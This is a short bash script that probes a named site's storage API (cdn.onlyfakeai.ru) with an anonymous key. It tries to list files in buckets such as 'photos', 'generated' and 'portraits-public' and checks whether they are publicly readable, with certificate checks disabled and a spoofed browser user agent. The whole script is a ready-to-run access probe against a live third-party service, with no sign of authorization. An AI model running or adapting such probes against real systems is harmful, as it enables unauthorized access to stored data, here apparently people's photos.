#!/bin/bash
set -u
SB="https://cdn.onlyfakeai.ru"
KEY='<publishable-key>'

echo "=== list attempts on sensitive buckets (anon) ==="
for b in generated photos backgrounds portraits-public; do
  echo "--- $b"
  curl -sS -k -m 15 -H "apikey: $KEY" -H "Authorization: Bearer $KEY" \
    -H 'Content-Type: application/json' -d '{"prefix":"","limit":5}' \
    "$SB/storage/v1/object/list/$b" | head -c 300; echo
done

echo
echo "=== bucket public flag (head object) ==="
for b in generated photos backgrounds; do
  echo "--- $b"
  curl -sS -k -m 15 -A "Mozilla/5.0" -o /dev/null -w 'HTTP %{http_code}\n' "$SB/storage/v1/object/public/$b/x_probe.jpg"
done
